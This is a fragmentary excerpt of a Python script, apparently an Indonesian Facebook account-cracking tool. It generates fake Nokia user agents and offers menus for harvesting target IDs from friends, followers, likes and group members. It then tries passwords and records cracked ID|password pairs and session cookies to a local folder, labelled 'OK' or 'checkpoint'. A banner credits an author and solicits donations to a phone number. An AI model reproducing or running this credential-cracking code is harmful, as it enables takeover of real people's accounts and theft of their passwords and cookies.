...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82'
...
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 9; Nokia C2'
	...
	i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0'
...
▐▌░░░▐▄▌░▐▌▒▒▒▐▌░▐▄▌░░▐▌
   ...
   ██▄▄▄▄▀▀┴┴╚╧╧╝╧╧╝┴┴███
   ██████████████████████     
   JANGAN LUPA DONASI PULSA/DANA 
   NO:083841935817
   NAMA AUTHOR : MR.G
   JANGAN RECOD TOD BELOM SEMPURNA 
'''
...
def menu(my_name,my_id):
	...
	io = '''[bold red][01] PUBLIC FRIENDS	     [06] CRACK FROM FILES
[02] PUBLIC FRIENDS {BULK}   [07] CHECKPOINT OPTIONS
[03] FOLLOWER		     [08] CHECK CRACK RESULTS
[04] LIKES THE POST	     [09] TIPS CRACK
[05] GROUP MEMBERS           [00] LOGOUT[bold red]'''
	oi = nel(io, style='red')
	cetak(nel(oi, title='[bold red] • MENU CRACK • [/bold red]'))
...
def dump_grup():
	...
	oi = nel(au, style='red')
	cetak(nel(oi, title='[bold red] • GROUP TARGET •[/bold red]'))
	au = '[•] TO STOP PRESS CTRL+C\n[•] IF STUCK ON OF AIRPLANE MODE'
	oi = nel(au, style='red')
	cetak(nel(oi, title='[bold red] • SUGGESTION •[/bold red]'))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='RIPER CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='RIPER OK'))
					ok+=1
					break
					...
					cetak(nel(statusok1, title='[bold green]RIPER OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='OKE PALSU'))
					open('/sdcard/4MBF-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				...
				if 'no' in taplikasi:
					...
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='ASLI OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
